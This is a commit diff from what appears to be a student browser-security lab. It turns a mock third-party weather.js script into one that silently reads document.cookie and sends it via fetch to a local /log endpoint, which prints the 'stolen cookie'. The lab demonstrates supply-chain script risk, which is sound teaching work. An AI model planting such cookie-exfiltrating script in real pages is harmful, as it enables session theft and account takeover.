6479f3df0b0bce88e4b0d743317e33bf365e57d7
qazxcvbnjhytr <nataliasumska95@gmail.com>
2026-03-18 23:55:51 +0200

    Lab4: додано тихе пересилання cookie на сервер погоди

--- lab1-browser-security/weather-5000/server.js
+++ lab1-browser-security/weather-5000/server.js
@@ -4,12 +4,22 @@ const app = express();
 const modeArg = process.argv.find((a) => a.startsWith("--mode="));
 const mode = modeArg ? modeArg.split("=")[1] : "normal";
 
+app.get("/log", (req, res) => {
+  const data = String(req.query.data || "");
+  console.log(`[Attacker] Stolen cookie: ${data || "(empty)"}`);
+  res.json({ ok: true });
+});
+
 app.get("/weather.js", (req, res) => {
   res.type("application/javascript");
 
   if (mode === "breach1") {
     res.send(
-      "alert(\"HACKED: I can see your cookies: \" + document.cookie + \" and User: \" + document.getElementById('username').innerText);"
+      [
+        "const stolenCookie = document.cookie;",
+        'fetch("http://localhost:5000/log?data=" + encodeURIComponent(stolenCookie));',
+        'console.log("Cookie successfully sent to Attacker Server!");',
+      ].join("\n")
     );
   } else {
     res.send('console.log("Weather: 12°C");');
